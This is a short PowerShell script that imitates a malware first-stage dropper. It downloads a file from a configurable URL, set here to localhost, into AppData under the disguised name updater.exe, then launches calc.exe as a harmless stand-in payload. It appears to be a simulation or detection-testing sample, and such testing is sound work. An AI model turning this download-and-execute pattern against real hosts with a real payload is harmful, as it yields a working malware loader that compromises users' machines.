
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://127.0.0.1/stage1.ps1",
    [string]$Stage2Path = "$env:APPDATA\updater.exe",
    [int]$TransferTimeout = 96
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $StageResult = Invoke-Stage1Download -SourceUrl $Stage1Url -DestinationPath $Stage2Path -TimeoutSec $TransferTimeout
    if ($StageResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Write-Verbose "stage marker 8 reached"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$StageMarker = "stage-16"
